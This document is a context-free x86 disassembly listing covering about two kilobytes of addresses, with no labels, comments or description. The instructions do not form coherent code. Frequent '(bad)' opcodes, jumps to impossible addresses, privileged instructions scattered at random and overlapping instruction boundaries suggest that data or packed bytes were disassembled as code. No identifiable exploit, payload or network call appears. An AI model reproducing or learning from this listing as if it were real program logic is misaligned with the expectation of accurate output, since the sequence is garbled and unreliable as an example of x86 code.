  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
